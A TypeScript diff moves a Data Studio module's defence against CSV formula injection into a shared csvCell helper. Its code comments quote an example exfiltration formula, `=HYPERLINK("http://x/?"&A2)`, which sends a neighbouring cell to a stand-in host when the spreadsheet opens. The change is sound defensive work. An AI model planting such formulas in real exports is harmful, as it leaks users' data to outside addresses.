@@ -21,6 +21,7 @@ export {
   type TransformKind,
 } from './data-storage';
 import { causalWording } from './research';
+import { csvCell } from '../csvcell';
 
 /**
  * The Data Studio's rules: import through the classification gate, keep the
@@ -217,27 +218,15 @@ export function interpretationGaps(p: DataProject): string[] {
  */
 export const fits = (next: readonly DataProject[]) => JSON.stringify(next).length <= DATA_BUDGET;
 
-/*
- * A cell a spreadsheet would read as a formula. `=`, `+`, `-` and `@` start
- * one in Excel, Sheets and LibreOffice, and a leading tab or carriage return
- * can hide one. `=HYPERLINK("http://x/?"&A2)` in a course dataset would send
- * the neighbouring cell to that address the moment the export is opened.
- */
-const FORMULA = /^[=+\-@\t\r]/;
-
 /**
- * CSV for a spreadsheet to open safely: formula-like cells are prefixed with
- * an apostrophe, which every spreadsheet shows as text, and any cell holding
- * a quote, comma or line break is quoted. A negative number loses nothing a
- * reader cares about — `'-3` displays as -3 — and the raw data, which is what
- * the analysis used, is untouched.
+ * CSV for a spreadsheet to open safely. A cell a spreadsheet would read as a
+ * formula (`=HYPERLINK("http://x/?"&A2)` in a course dataset would send the
+ * neighbouring cell to that address the moment the export is opened) is
+ * defused by the shared guard in `lib/csvcell.ts`, and the raw data, which is
+ * what the analysis used, is untouched.
  */
 export function toCsv(table: Table): string {
-  const cell = (c: string) => {
-    const safe = FORMULA.test(c) ? `'${c}` : c;
-    return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
-  };
-  return [table.headers, ...table.rows].map((r) => r.map(cell).join(',')).join('\n');
+  return [table.headers, ...table.rows].map((r) => r.map(csvCell).join(',')).join('\n');
 }
 
 export function methodsWriteUp(p: DataProject): string {
